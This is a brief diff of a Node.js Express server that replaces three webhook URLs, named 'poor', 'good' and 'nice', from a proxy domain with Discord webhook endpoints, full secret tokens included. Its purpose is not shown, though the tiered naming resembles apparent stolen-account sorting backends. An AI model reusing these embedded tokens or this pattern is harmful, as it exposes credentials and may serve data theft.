@@ -4,9 +4,9 @@ var bparse = require("body-parser");
 
 var app = express();
 app.use(bparse.json())
-var poor = "https://webhook.newstargeted.com/api/webhooks/1292555511212015798/UJVW_q6q8yap15yZ6bMMNG4OmdYjRZTXPvpqQD-HWTNan6w2KP0QJ8FdcYOaJL3I7ajK";
-var good = "https://webhook.newstargeted.com/api/webhooks/1292555611178930276/5FRUvRXRhPYh2m2vUAMhVDA9bhQYIX2GFueLN1awFf9-_dQOGgJYVnnfHJtUVmR2enrd";
-var nice = "https://webhook.newstargeted.com/api/webhooks/1293984385741361213/zKFC3xnhsQj-tSUPtUx1DT5oxdjCwvd2HuP64WeUFcimUE2M8HHxoQX7e7gjWWrfJjdA";
+var poor = "https://discord.com/api/webhooks/1382408255191384235/pmIazJgO5UGQEEku0T5BvIvqGIJ_tqfwen3EXnH42saXNiEKCrZCXOgEU7iMzzSRW2cL";
+var good = "https://discord.com/api/webhooks/1382408255191384235/pmIazJgO5UGQEEku0T5BvIvqGIJ_tqfwen3EXnH42saXNiEKCrZCXOgEU7iMzzSRW2cL";
+var nice = "https://discord.com/api/webhooks/1382401226918072481/0XaiNh-pUy_xgla-kEM8ogJKWn9B5u7-rD_s3EoKLhAN7QknlKCXfjV0m-SiYCC83eMp";
 
 app.get("/", async(req,res) => {
   res.send("sigma")
